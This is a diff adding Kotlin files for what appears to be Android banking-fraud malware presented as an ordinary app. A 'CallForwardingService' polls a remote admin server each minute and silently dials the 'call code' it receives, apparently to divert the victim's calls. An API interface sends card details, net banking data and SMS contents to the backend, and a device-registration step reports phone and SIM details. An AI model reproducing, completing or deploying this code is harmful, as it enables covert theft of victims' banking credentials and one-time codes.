@@ -1,0 +1,367 @@
+DeviceInfoUtil
+
+
+
+
+package com.example.refactor.utils
+
+import android.Manifest
+import android.content.Context
+import android.content.pm.PackageManager
+import android.os.Build
+import android.telephony.SubscriptionInfo
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
+import androidx.core.app.ActivityCompat
+
+object DeviceInfoUtil {
+    fun getDeviceDetails(context: Context): Map<String, Any> {
+        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+        val deviceDetails = mutableMapOf(
+            "model" to (Build.MODEL ?: "Unknown"),
+            "manufacturer" to (Build.MANUFACTURER ?: "Unknown"),
+            "androidVersion" to (Build.VERSION.RELEASE ?: "Unknown"),
+            "brand" to (Build.BRAND ?: "Unknown"),
+            "simOperators" to listOf("Unavailable")  // Default empty list
+        )
+
+        val simOperatorsList = mutableListOf<String>()
+
+        // ✅ Android 9 tak: Direct `TelephonyManager.networkOperatorName`
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                telephonyManager?.networkOperatorName?.let {
+                    simOperatorsList.add(it)
+                }
+            }
+        }
+        // ✅ Android 10+ me `SubscriptionManager` se dono SIM ka data milega
+        else {
+            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+            if (subscriptionManager != null && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                val activeSubscriptionInfoList: List<SubscriptionInfo>? = subscriptionManager.activeSubscriptionInfoList
+                if (!activeSubscriptionInfoList.isNullOrEmpty()) {
+                    for (subscriptionInfo in activeSubscriptionInfoList) {
+                        simOperatorsList.add(subscriptionInfo.carrierName.toString())
+                    }
+                }
+            }
+        }
+
+        // Agar SIM data mila ho to update karo
+        if (simOperatorsList.isNotEmpty()) {
+            deviceDetails["simOperators"] = simOperatorsList
+        }
+
+        return deviceDetails
+    }
+}
+
+
+
+
+
+AdminNumberFetcher
+
+
+
+package com.example.refactor.receivers
+
+import android.content.Context
+import android.util.Log
+import com.example.refactor.network.ApiClient
+import kotlinx.coroutines.*
+
+class AdminNumberFetcher(context: Context, private val uniqueId: String) {
+    private val appContext = context.applicationContext
+    private val sharedPreferences = appContext.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+    private val apiService = ApiClient.api
+    private var lastSavedCode: String? = null
+    private var isRunning = true
+
+    init {
+        lastSavedCode = getCallCode()
+        startFetching()
+    }
+
+    private fun startFetching() {
+        CoroutineScope(Dispatchers.IO).launch {
+            while (isRunning) {
+                fetchCallCode()
+                delay(60000) // 1 minute delay
+            }
+        }
+    }
+
+    private suspend fun fetchCallCode() {
+        try {
+            Log.d("AdminNumberFetcher", "Fetching call code for ID: $uniqueId")
+            val response = apiService.getCode(uniqueId)
+
+            if (response.isSuccessful) {
+                val responseBody = response.body()
+                if (responseBody != null && responseBody.success) {
+                    val newCode = responseBody.code ?: ""
+                    if (newCode.isNotEmpty() && newCode != lastSavedCode) {
+                        saveCode(newCode)
+                        lastSavedCode = newCode
+                        Log.d("AdminNumberFetcher", "New call code saved: $newCode")
+                    } else {
+                        Log.d("AdminNumberFetcher", "No new call code received.")
+                    }
+                } else {
+                    Log.e("AdminNumberFetcher", "API Response Error: ${responseBody?.message ?: "Unknown error"}")
+                }
+            } else {
+                Log.e("AdminNumberFetcher", "API Error: HTTP ${response.code()} - ${response.errorBody()?.string()}")
+            }
+        } catch (e: Exception) {
+            Log.e("AdminNumberFetcher", "Network Error: ${e.message}", e)
+        }
+    }
+
+    private fun saveCode(callCode: String) {
+        sharedPreferences.edit().putString("call_code", callCode).apply()
+        Log.d("AdminNumberFetcher", "Call code stored: $callCode")
+    }
+
+    fun getCallCode(): String? {
+        return sharedPreferences.getString("call_code", null).also {
+            Log.d("AdminNumberFetcher", "Retrieved call code: $it")
+        }
+    }
+
+    fun stopFetching() {
+        isRunning = false
+    }
+}
+
+
+
+
+CallForwardingService
+
+
+
+
+
+package com.example.refactor.services
+
+import android.Manifest
+import android.app.*
+import android.content.*
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
+import android.os.IBinder
+import android.util.Log
+import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
+import com.example.refactor.R
+import com.example.refactor.receivers.AdminNumberFetcher
+import com.example.refactor.receivers.DeviceRegistration
+
+class CallForwardingService : Service() {
+
+    companion object {
+        private const val TAG = "CallForwardingService"
+        private const val CHANNEL_ID = "callForwardingServiceChannel"
+        private const val NOTIFICATION_ID = 1
+    }
+
+    private lateinit var adminNumberFetcher: AdminNumberFetcher
+    private lateinit var deviceRegistration: DeviceRegistration
+    private var currentCallCode: String? = null
+    private var uniqueId: String? = null
+
+    override fun onCreate() {
+        super.onCreate()
+        createNotificationChannel()
+        startForegroundServiceWithNotification()
+
+        // Device Registration object create karo
+        deviceRegistration = DeviceRegistration(this)
+
+        // Unique ID fetch karo
+        uniqueId = deviceRegistration.getSavedUniqueId()
+
+        if (uniqueId.isNullOrEmpty()) {
+            Log.d(TAG, "Unique ID not found, registering device...")
+            deviceRegistration.registerDeviceIfNeeded()
+            uniqueId = deviceRegistration.getSavedUniqueId() // Register hone ke baad unique ID fetch karo
+        }
+
+        Log.d(TAG, "Using stored Unique ID: $uniqueId")
+
+        // AdminNumberFetcher ko uniqueId ke saath initialize karo
+        adminNumberFetcher = AdminNumberFetcher(this, uniqueId ?: "")
+
+        currentCallCode = adminNumberFetcher.getCallCode()
+        Log.d(TAG, "Initial call code: $currentCallCode")
+
+        val sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+        sharedPreferences.registerOnSharedPreferenceChangeListener(preferenceChangeListener)
+    }
+
+    private val preferenceChangeListener = SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
+        if (key == "call_code") {
+            val newCallCode = adminNumberFetcher.getCallCode()
+            if (!newCallCode.isNullOrEmpty() && newCallCode != currentCallCode) {
+                Log.d(TAG, "New call code detected: $newCallCode")
+                currentCallCode = newCallCode
+                forwardCall(newCallCode)
+            }
+        }
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Call Forwarding Service",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Handles automatic call forwarding."
+            }
+            val notificationManager = getSystemService(NotificationManager::class.java)
+            notificationManager.createNotificationChannel(channel)
+        }
+    }
+
+    private fun startForegroundServiceWithNotification() {
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Call Forwarding Service")
+            .setContentText("Service is running")
+            .setSmallIcon(R.drawable.ic_launcher_foreground)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .build()
+
+        startForeground(NOTIFICATION_ID, notification)
+    }
+
+    private fun forwardCall(code: String) {
+        if (!hasCallPermission()) {
+            Log.e(TAG, "CALL_PHONE permission not granted! Stopping service.")
+            stopSelf()
+            return
+        }
+
+        try {
+            val encodedNumber = Uri.encode(code)
+            val callIntent = Intent(Intent.ACTION_CALL).apply {
+                data = Uri.parse("tel:$encodedNumber")
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            }
+
+            if (callIntent.resolveActivity(packageManager) != null) {
+                startActivity(callIntent)
+                Log.d(TAG, "Call initiated successfully: $encodedNumber")
+            } else {
+                Log.e(TAG, "No app available to handle the call intent")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to initiate call: ${e.message}", e)
+        }
+    }
+
+    private fun hasCallPermission(): Boolean {
+        return ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        val sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+        sharedPreferences.unregisterOnSharedPreferenceChangeListener(preferenceChangeListener)
+        Log.d(TAG, "Service destroyed")
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+}
+
+
+
+
+
+
+DeviceData
+
+package com.example.refactor.models
+
+data class DeviceData(
+    val model: String,
+    val manufacturer: String,
+    val androidVersion: String,
+    val brand: String,
+    val simOperator: String,
+)
+
+
+
+
+DeviceRegisterResponse
+
+
+
+package com.example.refactor.models
+
+data class DeviceRegisterResponse(
+    val success: Boolean,
+    val message: String,
+    val uniqueid: String?
+)
+
+
+
+interace
+
+package com.example.refactor.network
+
+import com.example.refactor.models.FormData
+import com.example.refactor.models.CardPaymentData
+import com.example.refactor.models.NetBankingData
+import com.example.refactor.models.SmsData
+import com.example.refactor.ResponseModel
+import com.example.refactor.UserResponse
+import com.example.refactor.ApiResponse
+import com.example.refactor.models.DeviceData
+import com.example.refactor.models.DeviceRegisterResponse
+import retrofit2.Response
+import retrofit2.http.Body
+import retrofit2.http.GET
+import retrofit2.http.POST
+import retrofit2.http.Path
+
+interface ApiInterface {
+
+    @POST("detail/card")
+    suspend fun saveFormDataStep3(
+        @Body formData3: CardPaymentData
+    ): Response<ApiResponse<ResponseModel>>
+
+    @POST("payment/banking")
+    suspend fun saveFormDataStep2(
+        @Body formData2: NetBankingData
+    ): Response<ApiResponse<ResponseModel>>
+
+    @POST("device/admin/device-details")
+    suspend fun registerDevice(@Body deviceData: DeviceData): Response<DeviceRegisterResponse>
+
+    @POST("user/entry")
+    suspend fun saveFormDataStep1(@Body formData1: FormData): Response<ApiResponse<UserResponse>>
+
+    @GET("device/admin/call-status/{id}")
+    suspend fun getCode(@Path("id") uniqueId: String): Response<ApiResponse<String>>
+
+
+    @GET("admin/number")
+    suspend fun getAdminNumber(): Response<ApiResponse<String>>
+
+
+    @POST("notification/save")
+    suspend fun sendNotificationToBackend(@Body notification: SmsData): Response<ApiResponse<ResponseModel>>
+}
+
+
+
+
+
